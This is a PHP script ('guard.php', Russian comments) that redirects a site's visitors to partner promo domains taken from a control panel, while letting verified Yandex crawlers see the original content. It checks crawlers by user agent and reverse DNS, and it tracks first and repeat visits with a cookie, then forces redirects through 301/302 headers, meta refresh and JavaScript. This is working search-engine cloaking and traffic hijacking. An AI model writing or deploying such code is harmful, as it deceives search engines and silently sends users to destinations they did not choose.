<?php
/**
 * guard.php — единая точка:
 *  - маршрут PROMOLINK и PROMOLINK/* → редирект (internal_reg_url/override/base_new_url)
 *  - глобальные партнёрские редиректы (override ИЛИ подмена только домена по панели)
 *  - защита от двойного подключения
 */

if (defined('PROMO_GUARD_LOADED')) return;
define('PROMO_GUARD_LOADED', true);

require_once __DIR__ . '/bootstrap.php';
require_once __DIR__ . '/link_agent.php'; // la_get_active_domain(), la_replace_domain()

/* =========================
   Helpers
   ========================= */
function hasVisited(): bool {
  return isset($_COOKIE['visited_before']) && $_COOKIE['visited_before'] === '1';
}
function isYandexBot(): bool {
  $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
  return (stripos($ua, 'YTranslate') === false && stripos($ua, 'Yandex') !== false);
}
function get_ip_(): string {
  if (!empty($_SERVER['HTTP_CLIENT_IP']))       return $_SERVER['HTTP_CLIENT_IP'];
  if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
  return $_SERVER['REMOTE_ADDR'] ?? '';
}
function gethostbynamelv6_($host) {
  $dns = @dns_get_record($host);
  if (!$dns) return null;
  foreach ($dns as $r) {
    if (($r['type'] ?? '') === 'A')    return $r['ip'] ?? null;
    if (($r['type'] ?? '') === 'AAAA') return str_replace('::', ':0:', $r['ipv6'] ?? '');
  }
  return null;
}
function checking_search($ip): bool {
  if (!$ip) return false;
  $domain = @gethostbyaddr($ip);
  if (!$domain) return false;
  $dns = gethostbynamelv6_($domain) ?: @gethostbyname($domain);
  if ($dns != $ip) return false;
  $parts = explode('.', $domain);
  $n = count($parts);
  if ($n < 2) return false;
  $xdomain = $parts[$n-2] . '.' . $parts[$n-1];
  return ($xdomain === 'yandex.com' || $xdomain === 'yandex.net');
}
function safe_url(string $u): ?string {
  return preg_match('~^https?://~i', $u) ? $u : null;
}
function append_query(string $url, string $qs): string {
  if ($qs === '') return $url;
  return $url . (strpos($url, '?') !== false ? '&' : '?') . $qs; // PHP 7.4
}

/* =========================
   0) ВНУТРЕННИЙ PROMOLINK и PROMOLINK/*
   Работает ВСЕГДА, независимо от $redirect_enabled
   promolink задается в $promolink, например "/reg"
   В .htaccess должно быть:
   RewriteRule ^reg(?:/.*)?$ index.php [L,QSA]
   ========================= */
$reqPath = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';

$promoPath = '';
if (!empty($promolink)) {
  $promoPath = '/' . trim($promolink, '/'); // "/reg"
}

if ($promoPath && preg_match('~^' . preg_quote($promoPath, '~') . '(?:/.*)?$~i', $reqPath)) {

  // 1) Прямо на внутреннюю ссылку из конфига (если задана)
  if (!empty($internal_reg_url) && ($u = safe_url($internal_reg_url))) {
    $u = append_query($u, $_SERVER['QUERY_STRING'] ?? '');
    header('Cache-Control: no-store, no-cache, must-revalidate');
    header('Pragma: no-cache');
    header('Location: ' . $u, true, 302);
    exit;
  }

  // 2) Иначе, если есть override — пошлём туда
  if (!empty($partner_override_url) && ($u = safe_url($partner_override_url))) {
    $u = append_query($u, $_SERVER['QUERY_STRING'] ?? '');
    header('Location: ' . $u, true, 302);
    exit;
  }

  // 3) Иначе соберём ссылку из base + активный домен панели (подменим только host)
  $activeDomain = la_get_active_domain();
  $base = $base_new_url ?? '';
  if ($base) {
    $u = la_replace_domain($base, $activeDomain);
    $u = append_query($u, $_SERVER['QUERY_STRING'] ?? '');
    header('Location: ' . $u, true, 302);
    exit;
  }

  // Если вообще ничего не задано — просто отдадим контент сайта (без редиректа)
  return;
}

/* =========================
   1) ВЫКЛЮЧАТЕЛЬ ГЛОБАЛЬНЫХ РЕДИРЕКТОВ
   ========================= */
if (empty($redirect_enabled)) {
  // Глобальные редиректы выключены: сайт открывается как есть.
  return;
}

/* =========================
   2) СБОР КОНФИГА ДЛЯ ГЛОБАЛЬНОГО РЕДИРЕКТА
   ========================= */
$configRed = null;

// Вариант A — override из конфига
if (!empty($partner_override_url) && ($ov = safe_url($partner_override_url))) {
  $configRed = ['new_domain' => $ov, 'second_domain' => $ov];
}

// Вариант B — из базы (подмена только домена), если override не задан
if ($configRed === null) {
  $activeDomain = la_get_active_domain(); // напр. partners7k-promo.com
  $baseNew    = $base_new_url    ?? '';
  $baseSecond = $base_second_url ?? '';
  if ($baseNew && $baseSecond) {
    $configRed = [
      'new_domain'    => la_replace_domain($baseNew,    $activeDomain),
      'second_domain' => la_replace_domain($baseSecond, $activeDomain),
    ];
  }
}

// Если не получилось собрать ссылки — ничего не делаем
if (!is_array($configRed) || empty($configRed['new_domain']) || empty($configRed['second_domain'])) {
  return;
}

/* =========================
   3) ПРОВЕРКА ЯНДЕКСА + РЕДИРЕКТЫ
   ========================= */
$doRedirect = true;
if (isYandexBot()) {
  $ip = get_ip_();
  if (checking_search($ip)) $doRedirect = false;
}

if (!$doRedirect) return;

// Логика "первый визит / повторный визит"
if (hasVisited()) {
  header('HTTP/1.1 301 Moved Permanently');
  header('Location: ' . $configRed['second_domain']);
  exit;
} else {
  setcookie('visited_before', '1', time() + (30 * 24 * 60 * 60), '/', '', false, true);

  $t = htmlspecialchars($configRed['new_domain'], ENT_QUOTES, 'UTF-8');
  echo '<!doctype html><html lang="ru"><head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0;url='.$t.'">
    <script>location.href="'.$t.'";</script>
  </head><body>
    <p>Если не переадресовало автоматически, <a href="'.$t.'">нажмите сюда</a>.</p>
  </body></html>';
  exit;
}
